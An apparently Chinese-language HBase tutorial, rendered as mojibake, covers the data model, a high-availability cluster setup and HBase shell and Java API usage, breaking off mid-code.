queries//å—ç¼“å­˜å’Œå¸ƒéš†è¿‡æ»¤å™¨ç”¨äºå®æ—¶æŸ¥è¯¢ Query predicate push down via server side Filters//é€šè¿‡æœåŠ¡å™¨ç«¯è¿‡æ»¤å™¨å®ç°æŸ¥è¯¢é¢„æµ‹ Thrift gateway and a REST-ful Web service that supports XML, Protobuf, and binary data encoding options Extensible jruby-based (JIRB) shell Support for exporting metrics via the Hadoop metrics subsystem to files or Ganglia; or via JMX //å¯è§†åŒ– é¢å‘åˆ—æ•°æ®åº“ã€‚ HBaseè¦ç‚¹ 1) å®ƒä»‹äº NoSQL å’Œ RDBMS ä¹‹é—´ï¼Œä»…èƒ½é€šè¿‡ä¸»é”®(rowkey)å’Œä¸»é”®çš„ range æ¥æ£€ç´¢æ•°æ® 2) HBase æŸ¥è¯¢æ•°æ®åŠŸèƒ½å¾ˆç®€å•ï¼Œä¸æ”¯æŒ join ç­‰å¤æ‚æ“ä½œ 3) ä¸æ”¯æŒå¤æ‚çš„äº‹åŠ¡ï¼Œåªæ”¯æŒè¡Œçº§äº‹åŠ¡(å¯é€šè¿‡ hive æ”¯æŒæ¥å®ç°å¤šè¡¨ join ç­‰å¤æ‚æ“ä½œ)ã€‚ 4) HBase ä¸­æ”¯æŒçš„æ•°æ®ç±»å‹:byte 5) ä¸»è¦ç”¨æ¥å­˜å‚¨ç»“æ„åŒ–å’ŒåŠç»“æ„åŒ–çš„æ¾æ•£æ•°æ®ã€‚ HBase è¡¨ç‰¹ç‚¹ å¤§:ä¸€ä¸ªè¡¨å¯ä»¥æœ‰ä¸Šåäº¿è¡Œï¼Œä¸Šç™¾ä¸‡åˆ— é¢å‘åˆ—:é¢å‘åˆ—(æ—)çš„å­˜å‚¨å’Œæƒé™æ§åˆ¶ï¼Œåˆ—(ç°‡)ç‹¬ç«‹æ£€ç´¢ã€‚ ç¨€ç–:å¯¹äºä¸ºç©º(null)çš„åˆ—ï¼Œå¹¶ä¸å ç”¨å­˜å‚¨ç©ºé—´ï¼Œå› æ­¤ï¼Œè¡¨å¯ä»¥è®¾è®¡çš„éå¸¸ç¨€ç–ã€‚ æ— æ¨¡å¼:æ¯è¡Œéƒ½æœ‰ä¸€ä¸ªå¯æ’åºçš„ä¸»é”®å’Œä»»æ„å¤šçš„åˆ—ï¼Œåˆ—å¯ä»¥æ ¹æ®éœ€è¦åŠ¨æ€çš„å¢åŠ ï¼ŒåŒä¸€ å¼ è¡¨ä¸­ä¸åŒçš„è¡Œå¯ä»¥æœ‰æˆªç„¶ä¸åŒçš„åˆ— HBase å­˜å‚¨æœºåˆ¶ é¢å‘åˆ—å­˜å‚¨ï¼Œtableæ˜¯æŒ‰rowæ’åºã€‚ åº•å±‚æ˜¯ è·³è¡¨ &amp; å¸ƒéš†è¿‡æ»¤å™¨ HBase å®šä½æœºåˆ¶(ä¸‰çº§åæ ‡) è¡Œrowkey åˆ—æ— &amp; åˆ—column family &amp; column æ—¶é—´æˆ³timestampç‰ˆæœ¬ è¡¨ è¡Œ åˆ— åˆ—æ—çš„å…³ç³» å®˜ç½‘çš„å…³ç³»å›¾å¦‚ä¸‹ å…¶å®ƒç‰ˆæœ¬ Table is a collection of rows.è¡¨æ˜¯è¡Œçš„é›†åˆ Row is a collection of column familiesè¡Œæ˜¯åˆ—æ—çš„é›†åˆ Column family is a collection of columns.åˆ—æ—æ˜¯åˆ—çš„é›†åˆ Column is a collection of key value pairs.åˆ—æ˜¯é”®å€¼å¯¹çš„é›†åˆ(åˆ—å…¶å®å°±æ˜¯ key) RowKey, Column Family, TimeStamp, Cell æ¦‚å¿µè§£é‡Š RowKey æ˜¯ç”¨æ¥æ£€ç´¢è®°å½•çš„ä¸»é”® rowkey è¡Œé”®å¯ä»¥æ˜¯ä»»æ„å­—ç¬¦ä¸²(æœ€å¤§é•¿åº¦æ˜¯ 64KBï¼Œå®é™…åº”ç”¨ä¸­é•¿åº¦ä¸€èˆ¬ä¸º 10-100bytes)ï¼Œæœ€å¥½æ˜¯ 16ã€‚ æ¯ä¸€ä¸ªç‰©ç†æ–‡ä»¶ä¸­éƒ½ä¼šå­˜ä¸€ä¸ª rk:TODO ?? åœ¨ HBase å†…éƒ¨ï¼Œrowkey ä¿å­˜ä¸ºå­—èŠ‚æ•°ç»„ã€‚HBase ä¼šå¯¹è¡¨ä¸­çš„æ•°æ®æŒ‰ç…§ rowkey æ’åº (å­—å…¸é¡ºåº) è®¾è®¡ key æ—¶ï¼Œè¦å……åˆ†æ’åºå­˜å‚¨è¿™ ä¸ªç‰¹æ€§ï¼Œå°†ç»å¸¸ä¸€èµ·è¯»å–çš„è¡Œå­˜å‚¨æ”¾åˆ°ä¸€èµ·ã€‚(ä½ç½®ç›¸å…³æ€§) æ³¨æ„ï¼šå­—å…¸åºå¯¹ int æ’åºçš„ç»“æœæ˜¯1,10,100,11,12,13,14,15,16,17,18,19,2,20,21,â€¦9,91,92,93,94,95,96,97,98,99ã€‚è¦ä¿æŒæ•´å½¢çš„è‡ªç„¶åºï¼Œè¡Œé”®å¿…é¡»ç”¨ 0 ä½œå·¦å¡«å……ã€‚ Column Family åˆ—æ—æ˜¯è¡¨çš„ Schema çš„ä¸€éƒ¨åˆ†(è€Œåˆ—ä¸æ˜¯)ï¼Œå¿…é¡»åœ¨ä½¿ç”¨è¡¨ä¹‹å‰å®šä¹‰å¥½ï¼Œè€Œä¸”å®šä¹‰å¥½äº†ä¹‹åå°±ä¸èƒ½æ›´æ”¹ã€‚ HBase è¡¨ä¸­çš„æ¯ä¸ªåˆ—ï¼Œéƒ½å½’å±ä¸æŸä¸ªåˆ—ç°‡ã€‚ åˆ—ç°‡è¶Šå¤šï¼Œåœ¨å–ä¸€è¡Œæ•°æ®æ—¶æ‰€è¦å‚ä¸ IOã€æœå¯»çš„æ–‡ä»¶å°±è¶Šå¤šï¼Œæ‰€ä»¥ï¼Œå¦‚æœæ²¡æœ‰å¿…è¦ï¼Œä¸è¦ è®¾ç½®å¤ªå¤šçš„åˆ—ç°‡ï¼ˆæœ€å¥½å°±ä¸€ä¸ªåˆ—ç°‡ï¼‰ TimeStamp HBase ä¸­é€šè¿‡ rowkey å’Œ columns ç¡®å®šçš„ä¸ºä¸€ä¸ªå­˜å‚¨å•å…ƒç§°ä¸º cellã€‚ æ¯ä¸ª cell éƒ½ä¿å­˜ç€åŒä¸€ä»½ æ•°æ®çš„å¤šä¸ªç‰ˆæœ¬ã€‚ ç‰ˆæœ¬é€šè¿‡æ—¶é—´æˆ³æ¥ç´¢å¼•ã€‚ æ¯ä¸ª cell ä¸­ï¼Œä¸åŒç‰ˆæœ¬çš„æ•°æ®æŒ‰ç…§æ—¶é—´å€’åºæ’åºï¼Œå³æœ€æ–°çš„æ•°æ®æ’åœ¨æœ€å‰é¢ã€‚ hbase æä¾›äº†ä¸¤ç§æ•°æ®ç‰ˆ æœ¬å›æ”¶æ–¹å¼: ä¿å­˜æ•°æ®çš„æœ€å n ä¸ªç‰ˆæœ¬ ä¿å­˜æœ€è¿‘ä¸€æ®µæ—¶é—´å†…çš„ç‰ˆæœ¬(è®¾ç½®æ•°æ®çš„ç”Ÿå‘½å‘¨æœŸ TTL)ã€‚ Cell å•å…ƒæ ¼ ç”±{rowkey, column( = + ), version} å”¯ä¸€ç¡®å®šçš„å•å…ƒã€‚ Cell ä¸­çš„æ•°æ®æ˜¯æ²¡æœ‰ç±»å‹çš„ï¼Œå…¨éƒ¨æ˜¯å­—èŠ‚ç å½¢å¼å­˜è´®ã€‚ HBase çš„HAæ­å»º é€‰æ‹©å®‰è£…çš„ä¸»æœºcs1~cs4, å®‰è£…jdk, è§£å‹hbase åŒ…, é…ç½®ç¯å¢ƒå˜é‡ éªŒè¯å®‰è£…æ˜¯å¦æˆåŠŸ$&gt;hbase version é…ç½® hbase å®Œå…¨åˆ†å¸ƒå¼[hbase/conf/hbase-env.sh]export JAVA_HOME=/usr/local/jdk1.8.0_73export HBASE_MANAGES_ZK=false [hbse-site.xml] hbase.cluster.distributed true hbase.rootdir hdfs://mycluster/hbase hbase.zookeeper.quorum cs1:2181,cs2:2181,cs3:2181 hbase.zookeeper.property.dataDir /home/ap/zookeeper é…ç½® regonservers[hbase/conf/regionservers]cs2cs3cs4cs5 ä¿®æ”¹ backup-mastersï¼ˆè‡ªè¡Œåˆ›å»ºï¼‰ï¼ŒæŒ‡å®šå¤‡ç”¨çš„ä¸»HMaster vi backup-masterscs6 æœ€é‡è¦ä¸€æ­¥: å‚»é€¼ç‰ˆ: è¦æŠŠ hadoop çš„ hdfs-site.xml å’Œ core-site.xml æ”¾åˆ° hbase/conf ä¸‹, è¿™æ ·hbase æ‰èƒ½é€šè¿‡å‘½åç©ºé—´mycluster æ‰¾åˆ°å½“å‰å¯ç”¨ namenode, å†é€šè¿‡ namenode åˆ†é…æŒ‡å®š hbase åœ¨ HDFSä¸Šçš„å­˜å‚¨è·¯å¾„cp /apps/hadoop/etc/hadoop/core-site.xml /apps/hbase/conf/cp /apps/hadoop/etc/hadoop/hdfs-site.xml /apps/hbase/conf/ é«˜çº§ç‰ˆ: åœ¨hbase-env.shæ–‡ä»¶æ·»åŠ hadoopé…ç½®æ–‡ä»¶ç›®å½•åˆ°HBASE_CLASSPATHç¯å¢ƒå˜é‡å¹¶åˆ†å‘.[/soft/hbase/conf/hbase-env.sh]export HBASE_CLASSPATH=$HBASE_CLASSPATH:/soft/hadoop/etc/hadoop åœ¨hbase/conf/ç›®å½•ä¸‹åˆ›å»ºåˆ°hadoopçš„hdfs-site.xmlç¬¦å·è¿æ¥ã€‚$&gt;ln -s /soft/hadoop/etc/hadoop/hdfs-site.xml /soft/hbase/conf/hdfs-site.xml å¯åŠ¨ hbase é›†ç¾¤$&gt;start-hbase.sh ç™»å½• hbase çš„ webUI http://cs1:16010/ æ³¨æ„, é¡µé¢ä¸Šæ˜¾ç¤ºçš„ç‰ˆæœ¬, æ˜¯~/apps/hbase/libä¸­è‡ªå·±å­˜å‚¨çš„ jar åŒ…çš„ç‰ˆæœ¬ å¯åŠ¨/åœæ­¢ hbase è¿›ç¨‹ start-hbase.sh ç­‰ä»·äº hbase-daemon.sh start master hbase-daemons.sh start regionserver æ³¨æ„: åœ¨å“ªä¸ªèŠ‚ç‚¹å¯åŠ¨ start-hbase.sh , å°±åœ¨å“ªé‡Œå¯åŠ¨ HMaster è¿›ç¨‹, å¦‚æœ stop-hbase.shåœæ­¢ hbase HBase shell æ“ä½œç™»å½•shellç»ˆç«¯. $hbase&gt; hbase shell help ç›¸å…³ $hbase&gt; helpæŸ¥çœ‹æ‰€æœ‰å¸®åŠ© $hbase&gt; table_helpå…³äºè¡¨æ“ä½œçš„å¦å¤–ä¸€ç§æ–¹å¼çš„å¸®åŠ©æ–‡æ¡£ $hbase&gt; help â€œdmlâ€è·å–ä¸€ç»„å‘½ä»¤çš„æç¤º $hbase&gt;help â€˜list_namespaceâ€™æŸ¥çœ‹ç‰¹å®šçš„å‘½ä»¤å¸®åŠ© desc æŸ¥çœ‹æè¿°ä¿¡æ¯ desc â€˜t1â€™ : ä¸‹é¢è¿™äº›åœ¨å»ºè¡¨çš„æ—¶å€™éƒ½å¯ä»¥æŒ‡å®š{NAME =&gt; â€˜f1â€™, BLOOMFILTER =&gt; â€˜ROWâ€™, VERSIONS =&gt; â€˜1â€™, IN_MEMORY =&gt; â€˜falseâ€™, KEEP_DELETED_CELLS =&gt; â€˜FALSEâ€™, DATA_BLOCK_ENCODING =&gt; â€˜NONEâ€™, TTL =&gt; â€˜FOREVERâ€™, COMPRESSION =&gt; â€˜NONEâ€™, MIN_VERSIONS =&gt; â€˜0â€™, BLOCKCACHE =&gt; â€˜trueâ€™, BLOCKSIZE =&gt; â€˜65536â€™, REPLICATION_SCOPE =&gt; â€˜0â€™}1 row(s) in 0.1780 seconds list ç›¸å…³ $hbase&gt; liståˆ—å‡ºæ‰€æœ‰éç³»ç»Ÿè¡¨ $hbase&gt;list_namespaceåˆ—å‡ºåå­—ç©ºé—´(æ•°æ®åº“) $hbase&gt;list_namespace_tables â€˜defalutâ€™åˆ—å‡ºåå­—ç©ºé—´çš„æ‰€ä»¥è¡¨ create ç›¸å…³ $hbase&gt;create_namespace â€˜ns1â€™åˆ›å»ºåå­—ç©ºé—´ $hbase&gt;create â€˜ns1:t1â€™,â€™f1â€™åˆ›å»ºè¡¨,æŒ‡å®šç©ºé—´ä¸‹,åˆ—æ—æ³¨æ„: å¦‚æœ t1å·²ç»åˆ›å»ºäº†, å°±ä¸èƒ½é€šè¿‡è¿™ä¸ªæ–¹å¼æ¥æ·»åŠ  åˆ—æ— create â€˜t1â€™,â€™f1â€™ create â€˜user_infoâ€™,{NAME=&gt;â€™base_infoâ€™,VERSIONS=&gt;3 },{NAME=&gt;â€™extra_infoâ€™,VERSIONS=&gt;1 }åŒæ—¶åˆ›å»ºå¤šä¸ª åˆ—æ— exist ç›¸å…³ exists â€˜t1â€™æŸ¥çœ‹è¡¨æ˜¯å¦å­˜åœ¨ put ç›¸å…³ æ³¨æ„: å¦‚æœå¾€ åŒè¡¨ &amp; åŒrowkey &amp; åŒæ ·çš„åˆ— ä¸­æ’å…¥ value, ä¼šé»˜è®¤å±•ç¤ºæœ€è¿‘çš„ä¸€ä¸ªæ—¶é—´æˆ³çš„ä¿¡æ¯, å¦‚æœ get çš„å›æ”¶æŒ‡å®š VERSIONSæ•°é‡, åˆ™ä¼šå±•ç¤ºæ­¤æ•°é‡çš„ç‰ˆæœ¬ä¿¡æ¯ å‘ user è¡¨ä¸­æ’å…¥ä¿¡æ¯ï¼Œrow key ä¸º rk0001ï¼Œåˆ—ç°‡ info ä¸­æ·»åŠ  name åˆ—æ ‡ç¤ºç¬¦ï¼Œå€¼ä¸º zhangsan put â€˜userâ€™, â€˜rk0001â€™, â€˜info:nameâ€™, â€˜zhangsanâ€™, 1482077777777æ‰‹åŠ¨æŒ‡å®šæ—¶é—´æˆ³æ—¶é—´æˆ³æ˜¯å¯ä»¥è‡ªå·±æŒ‡å®šçš„ï¼Œå¦‚è‹¥ä¸æŒ‡å®šï¼Œåˆ™ä¼šè‡ªåŠ¨è·å–ç³»ç»Ÿçš„å½“å‰æ—¶é—´çš„æ—¶é—´æˆ³ å‘ user è¡¨ä¸­æ’å…¥ä¿¡æ¯ï¼Œrow key ä¸º rk0001ï¼Œåˆ—ç°‡ info ä¸­æ·»åŠ  gender åˆ—æ ‡ç¤ºç¬¦ï¼Œå€¼ä¸º female put â€˜userâ€™, â€˜rk0001â€™, â€˜info:genderâ€™, â€˜femaleâ€™ å‘ user è¡¨ä¸­æ’å…¥ä¿¡æ¯ï¼Œrow key ä¸º rk0001ï¼Œåˆ—ç°‡ info ä¸­æ·»åŠ  age åˆ—æ ‡ç¤ºç¬¦ï¼Œå€¼ä¸º 20 put â€˜userâ€™, â€˜rk0001â€™, â€˜info:ageâ€™, 20 å‘ user è¡¨ä¸­æ’å…¥ä¿¡æ¯ï¼Œrow key ä¸º rk0001ï¼Œåˆ—ç°‡ data ä¸­æ·»åŠ  pic åˆ—æ ‡ç¤ºç¬¦ï¼Œå€¼ä¸º picture put â€˜userâ€™, â€˜rk0001â€™, â€˜data:picâ€™, â€˜pictureâ€™ get ç›¸å…³ è·å– user è¡¨ä¸­ row key ä¸º rk0001 çš„æ‰€æœ‰ä¿¡æ¯ æ³¨æ„: â€˜è¡¨åâ€™, â€˜ rowkeyâ€™ get â€˜userâ€™, â€˜rk0001â€™ è·å– user è¡¨ä¸­ row key ä¸º rk0001ï¼Œinfo åˆ—ç°‡çš„æ‰€æœ‰ä¿¡æ¯ æ³¨æ„: â€˜è¡¨åâ€™, â€˜ rowkeyâ€™, â€˜åˆ—æ—åâ€™ get â€˜userâ€™, â€˜rk0001â€™, â€˜infoâ€™ è·å– user è¡¨ä¸­ row key ä¸º rk0001ï¼Œinfo åˆ—ç°‡çš„ nameã€age åˆ—æ ‡ç¤ºç¬¦çš„ä¿¡æ¯ æ³¨æ„: â€˜è¡¨åâ€™, â€˜rowkeyâ€™, â€˜åˆ—æ—åâ€™:â€™åˆ—åâ€™, â€˜åˆ—æ—åâ€™:â€™åˆ—åâ€™ get â€˜userâ€™, â€˜rk0001â€™, â€˜info:nameâ€™, â€˜info:ageâ€™ è·å– user è¡¨ä¸­ row key ä¸º rk0001ï¼Œinfoã€data åˆ—ç°‡çš„ä¿¡æ¯ æ³¨æ„: â€˜è¡¨åâ€™, â€˜rowkeyâ€™, â€˜åˆ—æ—åâ€™, â€˜åˆ—æ—åâ€™ get â€˜userâ€™, â€˜rk0001â€™, â€˜infoâ€™, â€˜dataâ€™ get â€˜userâ€™, â€˜rk0001â€™, {COLUMN =&gt; [â€˜infoâ€™, â€˜dataâ€™]} get â€˜userâ€™, â€˜rk0001â€™, {COLUMN =&gt; [â€˜info:nameâ€™, â€˜data:picâ€™]} è·å– user è¡¨ä¸­ row key ä¸º rk0001ï¼Œåˆ—ç°‡ä¸º infoï¼Œç‰ˆæœ¬å·æœ€æ–° 5 ä¸ªçš„ä¿¡æ¯ æ³¨æ„: â€˜è¡¨åâ€™, â€˜rowkeyâ€™, {COLUMN =&gt;â€™åˆ—æ—åâ€™, å­˜å‚¨ç‰ˆæœ¬æ•°=&gt; æ•°é‡} get â€˜userâ€™, â€˜rk0001â€™, {COLUMN =&gt; â€˜infoâ€™, VERSIONS =&gt; 2} get â€˜userâ€™, â€˜rk0001â€™, {COLUMN =&gt; â€˜info:nameâ€™, VERSIONS =&gt; 5} get â€˜userâ€™, â€˜rk0001â€™, {COLUMN =&gt; â€˜info:nameâ€™, VERSIONS =&gt; 5, TIMERANGE =&gt; [1392368783980, 1392380169184]} è·å– user è¡¨ä¸­ row key ä¸º rk0001ï¼Œåˆ—æ ‡ç¤ºç¬¦ä¸­å«æœ‰ a çš„ä¿¡æ¯ get â€˜peopleâ€™, â€˜rk0001â€™, {FILTER =&gt; â€œ(QualifierFilter(=,â€™substring:aâ€™))â€} è·å– å›½ç± ä¸ºä¸­å›½çš„ç”¨æˆ·ä¿¡æ¯ æ³¨æ„: â€˜è¡¨åâ€™, â€˜rowkeyâ€™, â€˜åˆ—æ—åâ€™:â€™åˆ—åâ€™, â€˜valueâ€™ put â€˜userâ€™, â€˜rk0002â€™, â€˜info:nameâ€™, â€˜fanbingbingâ€™ put â€˜userâ€™, â€˜rk0002â€™, â€˜info:genderâ€™, â€˜femaleâ€™ put â€˜userâ€™, â€˜rk0002â€™, â€˜info:nationalityâ€™, â€˜ä¸­å›½â€™ get â€˜userâ€™, â€˜rk0002â€™, {FILTER =&gt; â€œValueFilter(=, â€˜binary:ä¸­å›½â€™)â€} è·å–2ä¸ªä¸åŒåˆ—ä¸­çš„æŒ‡å®šå­—æ®µ æ³¨æ„: â€˜è¡¨åâ€™, â€˜rowkeyâ€™, {COLUMN =&gt; [â€˜åˆ—æ—åâ€™:â€™åˆ—åâ€™, â€˜åˆ—æ—åâ€™:â€™åˆ—åâ€™]} get â€˜userâ€™, â€˜rk0002â€™, {COLUMN =&gt; [â€˜info:nameâ€™, â€˜data:picâ€™]} scan ç›¸å…³ æ‰«æå…ƒæ•°æ® scan â€˜hbase : metaâ€™ t9,,1529936935368.f1a900954c069f0319195f16043c8e1a column=info:regioninfo, timestamp=1529936935933, value={ENCODED =&gt; f1a900954c069f0319195f16043c8e1a, NAME =&gt; â€˜t9,,1529936935368.f1a900954c069f031919 . 5f16043c8e1a.â€™, STARTKEY =&gt; â€˜â€™, ENDKEY =&gt; â€˜â€™} t9,,1529936935368.f1a900954c069f0319195f16043c8e1a column=info:seqnumDuringOpen, timestamp=1529936935933, value=\x00\x00\x00\x00\x00\x00\x00\x02 . t9,,1529936935368.f1a900954c069f0319195f16043c8e1a column=info:server, timestamp=1529936935933, value=cs5:16020 . t9,,1529936935368.f1a900954c069f0319195f16043c8e1a column=info:serverstartcode, timestamp=1529936935933, value=1529923622913 $hbase&gt;split â€˜ns1:t1â€™//åˆ‡å‰²è¡¨ $hbase&gt;split â€˜â€™ //åˆ‡å‰²åŒºåŸŸ, è§ä¸‹é¢ åˆ‡å‰²ä¹‹å‰ åˆ‡å‰²ä¹‹å UIç•Œé¢ table regions ç»§ç»­è¿›è¡Œ region åˆ‡å‰² scan â€˜hbase:metaâ€™ æ‰¾åˆ°åˆ‡å‰²ç‚¹ STARTKEY =&gt; â€˜row000550â€™ çš„ é‚£è¡Œçš„ NAME =&gt; åé¢çš„å€¼ ä»è¿™ä¸ªå€¼å¼€å§‹åˆ‡å‰²åˆ°æŒ‡å®šå€¼split â€˜t9,row000551,1529938745618.90ed2fb6b7744ea5f0a7ff613d05aada.â€™,â€™row000888â€™ æ‰«æè¡¨ä¸­æ‰€æœ‰çš„ä¿¡æ¯ $hbase&gt;scan â€˜ns1:t1â€™ æŸ¥è¯¢ user è¡¨ä¸­åˆ—ç°‡ä¸º info çš„ä¿¡æ¯ hbase&gt; scan â€˜hbase:metaâ€™æ‰«ææƒæ ‡ $hbase&gt; scan â€˜hbase:metaâ€™, {COLUMNS =&gt; â€˜infoâ€™}æ³¨æ„: COLUMNSè¦å¤§å†™ $hbase&gt; scan â€˜ns1:t1â€™, {COLUMNS =&gt; [â€˜c1â€™, â€˜c2â€™], LIMIT =&gt; 10, STARTROW =&gt; â€˜xyzâ€™} scan â€˜userâ€™, {COLUMNS =&gt; â€˜infoâ€™, RAW =&gt; true, VERSIONS =&gt; 5} scan â€˜persionâ€™, {COLUMNS =&gt; â€˜infoâ€™, RAW =&gt; true, VERSIONS =&gt; 3}Scan æ—¶å¯ä»¥è®¾ç½®æ˜¯å¦å¼€å¯ Raw æ¨¡å¼ï¼Œå¼€å¯ Raw æ¨¡å¼ä¼šè¿”å›åŒ…æ‹¬å·²æ·»åŠ åˆ é™¤æ ‡è®°ä½†æ˜¯æœª å®é™…åˆ é™¤çš„æ•°æ®ã€‚ æŸ¥è¯¢ user è¡¨ä¸­åˆ—ç°‡ä¸º info å’Œ data çš„ä¿¡æ¯ scan â€˜userâ€™, {COLUMNS =&gt; [â€˜infoâ€™, â€˜dataâ€™]} scan â€˜userâ€™, {COLUMNS =&gt; [â€˜info:nameâ€™, â€˜data:picâ€™]} æŸ¥è¯¢ user è¡¨ä¸­åˆ—ç°‡ä¸º infoã€åˆ—æ ‡ç¤ºç¬¦ä¸º name çš„ä¿¡æ¯ scan â€˜userâ€™, {COLUMNS =&gt; â€˜info:nameâ€™} æŸ¥è¯¢ user è¡¨ä¸­åˆ—ç°‡ä¸º infoã€åˆ—æ ‡ç¤ºç¬¦ä¸º name çš„ä¿¡æ¯,å¹¶ä¸”ç‰ˆæœ¬æœ€æ–°çš„ 5 ä¸ª scan â€˜userâ€™, {COLUMNS =&gt; â€˜info:nameâ€™, VERSIONS =&gt; 5} æŸ¥è¯¢ user è¡¨ä¸­åˆ—ç°‡ä¸º info å’Œ data ä¸”åˆ—æ ‡ç¤ºç¬¦ä¸­å«æœ‰ a å­—ç¬¦çš„ä¿¡æ¯ scan â€˜userâ€™, {COLUMNS =&gt; [â€˜infoâ€™, â€˜dataâ€™], FILTER =&gt; â€œ(QualifierFilter(=,â€™substring:aâ€™))â€} æŸ¥è¯¢ user è¡¨ä¸­åˆ—ç°‡ä¸º infoï¼Œrk èŒƒå›´æ˜¯[rk0001, rk0003)çš„æ•°æ® scan â€˜peopleâ€™, {COLUMNS =&gt; â€˜infoâ€™, STARTROW =&gt; â€˜rk0001â€™, ENDROW =&gt; â€˜rk0003â€™} æŸ¥è¯¢ user è¡¨ä¸­ row key ä»¥ rk å­—ç¬¦å¼€å¤´çš„ scan â€˜userâ€™,{FILTER=&gt;â€PrefixFilter(â€˜rkâ€™)â€} æŸ¥è¯¢ user è¡¨ä¸­æŒ‡å®šèŒƒå›´çš„æ•°æ® scan â€˜userâ€™, {TIMERANGE =&gt; [1392368783980, 1392380169184]} delete/truncate ç›¸å…³ (åˆ é™¤,æ¸…ç©ºæ•°æ®) æ³¨æ„: åˆ é™¤åˆ—æ—, åœ¨ alter ä¸­ åˆ é™¤ user è¡¨ row key ä¸º rk0001ï¼Œåˆ—æ ‡ç¤ºç¬¦ä¸º info:name çš„å­—æ®µæ•°æ® delete â€˜peopleâ€™, â€˜rk0001â€™, â€˜info:nameâ€™ åˆ é™¤ user è¡¨ row key ä¸º rk0001ï¼Œåˆ—æ ‡ç¤ºç¬¦ä¸º info:nameï¼Œtimestamp ä¸º 1392383705316 çš„æ•°æ® delete â€˜userâ€™, â€˜rk0001â€™, â€˜info:nameâ€™, 1392383705316 æ¸…ç©º user è¡¨ä¸­çš„æ•°æ® truncate â€˜peopleâ€™ç›®å‰ç‰ˆæœ¬ä¼šå…ˆ disable , å† truncate, æœ€åå† enable alter ç›¸å…³ æ³¨æ„,åœ¨ä¿®æ”¹åˆ—æ— æ—¶ hbase&gt; alter â€˜t1â€™, NAME =&gt; â€˜f1â€™, VERSIONS =&gt; 5 VERSIONS æ˜¯æŒ‡èƒ½å­˜å¤šå°‘ä¸ªç‰ˆæœ¬, å¦‚æœä¸æŒ‡å®šçš„è¯, é€€å‡º hbase çš„æ—¶å€™, é»˜è®¤åªä¼šç•™æœ€æ–°çš„ä¸€ä¸ªç‰ˆæœ¬ å¦‚æœå­˜åœ¨, å°±æ˜¯ä¿®æ”¹ ä¸å­˜åœ¨, å°±æ˜¯å¢åŠ  æ·»åŠ ä¸¤ä¸ªåˆ—ç°‡ f1 å’Œ f2 ç®€å†™: alter â€˜t1â€™, â€˜f2â€™ alter â€˜peopleâ€™, NAME =&gt; â€˜f1â€™ alter â€˜userâ€™, NAME =&gt; â€˜f2â€™ åœç”¨/å¯ç”¨ è¡¨ enable â€˜t9â€™å¯ç”¨ is_enabled â€˜t9â€™æ˜¯å¦å¯ç”¨ disable â€˜t9â€™åœç”¨ is_disabled â€˜t9â€™æ˜¯å¦ä¸å¯ç”¨ åˆ é™¤ä¸€ä¸ªåˆ—ç°‡: æ³¨æ„: å½“è¡¨ä¸­åªæœ‰ä¸€ä¸ªåˆ—æ—æ—¶, æ— æ³•å°†å…¶åˆ é™¤ disable â€˜userâ€™(æ–°ç‰ˆæœ¬ä¸ç”¨) alter â€˜userâ€™, NAME =&gt; â€˜f1â€™, METHOD =&gt; â€˜deleteâ€™ æˆ– alter â€˜userâ€™, â€˜deleteâ€™ =&gt; â€˜f1â€™ enable â€˜userâ€™ æ·»åŠ åˆ—ç°‡ f1 åŒæ—¶åˆ é™¤åˆ—ç°‡ f2 disable â€˜userâ€™(æ–°ç‰ˆæœ¬ä¸ç”¨) alter â€˜userâ€™, {NAME =&gt; â€˜f1â€™}, {NAME =&gt; â€˜f2â€™, METHOD =&gt; â€˜deleteâ€™} enable â€˜userâ€™ å°† user è¡¨çš„ f1 åˆ—ç°‡ç‰ˆæœ¬å·æ”¹ä¸º 5 disable â€˜userâ€™(æ–°ç‰ˆæœ¬ä¸ç”¨) alter â€˜peopleâ€™, NAME =&gt; â€˜infoâ€™, VERSIONS =&gt; 5people ä¸º rowkey enable â€˜userâ€™ drop ç›¸å…³ disable â€˜userâ€™ drop â€˜userâ€™ count ç›¸å…³ $hbase&gt;count â€˜ns1:t1â€™ç»Ÿè®¡å‡½æ•°, 1000è¡Œç»Ÿè®¡ä¸€æ¬¡ flush ç›¸å…³ æŠŠæ–‡ä»¶åˆ·åˆ°ç£ç›˜çš„è¿‡ç¨‹ hbase&gt; flush â€˜TABLENAMEâ€™ hbase&gt; flush â€˜REGIONNAMEâ€™ hbase&gt; flush â€˜ENCODED_REGIONNAMEâ€™ ValueFilter è¿‡æ»¤å™¨ get â€˜personâ€™, â€˜rk0001â€™, {FILTER =&gt; â€œValueFilter(=, â€˜binary:ä¸­å›½â€™)â€} get â€˜personâ€™, â€˜rk0001â€™, {FILTER =&gt; â€œ(QualifierFilter(=,â€™substring:aâ€™))â€} exit é€€å‡º$hbase&gt; exit é‡åˆ°é—®é¢˜æ€»ç»“ æ’å…¥å‰, å¿…é¡»åˆ›å»ºå¥½ namespaceç›¸å½“äºæ•°æ®åº“çš„æ¦‚å¿µ tableè¡¨å‘½ column familyåˆ—æ—å ä¸éœ€è¦æå‰åˆ›å»º è¡Œå åˆ—å value å¦‚æœè¡¨å·²ç»åˆ›å»º, è¦å¢åŠ åˆ—æ—çš„è¯, åªèƒ½ç”¨ alter, ä¸èƒ½ç»§ç»­ç”¨ create é€šè¿‡Java APIè®¿é—®Hbase åˆ›å»ºhbaseæ¨¡å— æ·»åŠ ä¾èµ–&lt;?xml version=â€1.0â€ encoding=â€UTF-8â€?&gt; 4.0.0 com.rox HbaseDemo 1.0-SNAPSHOT org.apache.hbase hbase-client 1.2.3 å¤åˆ¶hbaseé›†ç¾¤çš„hbase-site.xmlæ–‡ä»¶åˆ°æ¨¡å—çš„src/main/resourcesç›®å½•ä¸‹ã€‚ -â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” Hbase API ç±»å’Œæ•°æ®æ¨¡å‹ä¹‹é—´çš„å¯¹åº”å…³ç³»: \0. æ€»çš„å¯¹åº”å…³ç³» HBaseAdmin ç¼–ç¨‹å®ç° ä»£ç è§ https://github.com/airpoet/bigdata/blob/master/HBaseDemo/src/test/java/com/rox/text/TestCRUD.javapublic class TestCRUD {@Testpublic void put() throws IOException {// åˆ›å»º conf å¯¹è±¡Configuration conf = HBaseConfiguration.create();/ é€šè¿‡è¿æ¥å·¥å‚åˆ›å»ºè¿æ¥å¯¹ /// é€šè¿‡è¿æ¥å·¥å‚åˆ›å»ºè¿æ¥å¯¹è±¡Connection conn = 